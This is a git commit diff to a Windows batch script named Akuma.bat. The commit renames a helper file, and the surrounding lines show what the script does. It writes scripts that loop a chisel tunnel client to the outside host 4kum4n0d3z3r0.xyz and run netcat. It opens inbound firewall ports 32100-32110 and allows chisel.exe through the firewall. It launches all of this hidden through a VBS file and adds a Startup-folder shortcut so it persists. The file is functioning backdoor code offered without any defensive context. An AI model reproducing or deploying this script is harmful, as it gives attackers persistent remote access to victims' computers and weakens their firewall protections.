0dbe16526d39bf6990ffb57b651da74bd76bc90b
L <112792604+l-urk@users.noreply.github.com>
2023-10-27 16:00:43 -0700

    Update Akuma.bat

--- Akuma.bat
+++ Akuma.bat
@@ -20,14 +20,14 @@ echo goto start >> %homedrive%\Akuma\nc.bat
 echo :start >> %homedrive%\Akuma\chisel.bat
 echo %homedrive%\Akuma\chisel.exe client 4kum4n0d3z3r0.xyz:32101 127.0.0.1:32102 >> %homedrive%\Akuma\chisel.bat
 echo goto start >> %homedrive%\Akuma\chisel.bat
-echo netsh advfirewall firewall delete rule name=".akuma" >> %homedrive%\Akuma\ntwrk.bat
-echo netsh advfirewall firewall add rule name=".akuma" dir=in action=allow protocol=TCP localport=32100-32110 >> %homedrive%\Akuma\ntwrk.bat
+echo netsh advfirewall firewall delete rule name=".akuma" >> %homedrive%\Akuma\network.bat
+echo netsh advfirewall firewall add rule name=".akuma" dir=in action=allow protocol=TCP localport=32100-32110 >> %homedrive%\Akuma\network.bat
 echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %homedrive%\Akuma\ntwrk.bat
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\nc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\chisel.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
-echo objShell.Run "%homedrive%\Akuma\ntwrk.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
+echo objShell.Run "%homedrive%\Akuma\network.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo y| del "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
 start %homedrive%\Akuma\Akuma.vbs
